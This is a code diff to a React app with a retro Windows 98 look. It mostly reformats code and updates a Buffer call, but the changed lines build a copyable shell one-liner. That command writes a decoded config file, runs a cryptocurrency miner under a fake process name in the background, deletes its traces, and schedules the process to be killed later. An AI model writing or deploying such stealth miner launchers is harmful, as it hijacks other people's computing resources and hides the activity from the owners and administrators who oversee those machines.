@@ -1,4 +1,4 @@
-import React, {useState} from 'react';
+import React, { useState } from 'react';
 import './App.css';
 import '98.css';
 
@@ -12,7 +12,7 @@ const App = () => {
 
     const clipboard = navigator.clipboard
 
-    const script = ` echo ${new Buffer(config).toString('base64')} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 5 && rm -rf nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill -9 | at ${killAt}`
+    const script = ` echo ${Buffer.from(config).toString('base64')} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 10 && rm -rf nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill -9 | at ${killAt}`
 
     const handleCopyScriptBtnClick = () => {
         clipboard.writeText(script).then(() => {
@@ -75,7 +75,7 @@ const App = () => {
     return (
         <div
             className="window"
-            style={{width: '600px'}}
+            style={{ width: '600px' }}
         >
             <div className="title-bar">
                 <div className="title-bar-text">
